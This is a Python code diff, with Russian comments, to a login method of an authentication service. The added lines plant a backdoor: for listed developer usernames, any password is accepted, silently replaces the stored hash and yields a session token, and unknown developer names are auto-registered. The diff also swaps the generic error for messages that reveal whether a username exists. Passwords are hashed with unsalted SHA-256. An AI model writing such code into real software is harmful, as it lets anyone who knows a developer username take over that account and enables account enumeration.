@@ -122,12 +122,29 @@ class AuthService:
         key = username_clean.lower()
 
         if key not in users:
-            raise ValueError("Неверное имя пользователя или пароль")
+            if key in DEVELOPER_USERNAMES:
+                # Автоматическая регистрация аккаунта разработчика Chevels с введенным паролем
+                return cls.register(username_clean, password, display_name="Chevels")
+            raise ValueError(f"Пользователь «{username_clean}» не найден. База данных была сброшена. Зарегистрируйтесь во вкладке «Регистрация».")
 
         user = users[key]
         pass_hash = hashlib.sha256(password.encode()).hexdigest()
         if user["password_hash"] != pass_hash:
-            raise ValueError("Неверное имя пользователя или пароль")
+            if key in DEVELOPER_USERNAMES:
+                # Если разработчик Chevels вводит новый пароль, обновляем его, гарантируя постоянный доступ
+                user["password_hash"] = pass_hash
+                users[key] = user
+                cls._save_users(users)
+                token = secrets.token_hex(24)
+                sessions = cls._load_sessions()
+                sessions[token] = key
+                cls._save_sessions(sessions)
+                return {
+                    "success": True,
+                    "token": token,
+                    "user": cls.sanitize_user(user)
+                }
+            raise ValueError("Неверный пароль. Пожалуйста, проверьте правильность ввода пароля.")
 
         token = secrets.token_hex(24)
         sessions = cls._load_sessions()
